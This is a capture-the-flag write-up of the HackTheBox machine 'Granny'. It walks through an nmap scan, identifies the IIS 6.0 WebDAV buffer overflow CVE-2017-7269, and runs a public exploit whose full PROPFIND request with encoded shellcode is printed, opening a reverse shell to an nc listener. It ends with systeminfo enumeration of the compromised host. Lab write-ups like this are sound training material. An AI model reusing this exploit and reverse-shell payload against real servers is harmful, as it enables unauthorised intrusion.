# Granny | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.2.63
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-12 10:14 UTC
Nmap scan report for 10.129.2.63
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 12 Dec 2020 10:21:01 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 S4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   216.32 ms 10.10.14.1
2   216.46 ms 10.129.2.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.95 seconds
```
The machine is running Windows with an IIS 6.0 server.

### 2. Check out the web server
When hitting the web server through port 80, I get an "Under Construction" message, informing the user that the site does not have a default page and may be in the process of being developed. I run a dirbust of the main site directory and get a few empty folders.
  
Following this I investigate the server version and discover it is vulnerable to RCE via a buffer overflow, as detailed at https://github.com/edwardz246003/IIS_exploit.

*Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.*.
Given that nmap has identified PROPFIND as a publically-available method, this vulnerability is most likely exploitable.

### 3. Get a shell
I find a reverse shell exploit online.
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny]
└──╼ [★]$ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
Cloning into 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Receiving objects: 100% (6/6), done.
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny]
└──╼ [★]$ cd iis6-exploit-2017-CVE-2017-7269/
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ chmod +x iis6\ reverse\ shell
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ mv iis6\ reverse\ shell exploit.py
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ ./exploit.py 
usage:iis6webdav.py targetip targetport reverseip reverseport
```
Run it with my listener.
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ ./exploit.py 10.129.61.27 80 10.10.14.110 9999
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
Check nc:
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-w9attlsjby]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.110] from (UNKNOWN) [10.129.61.27] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

### 4. Enumerate from foothold
Straight away just from the cmd header I can tell this is an older version of Windows.
```shell
c:\windows\system32\inetsrv>systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 6 Minutes, 9 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1998 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 804 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,338 MB
Page File: In Use:         132 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
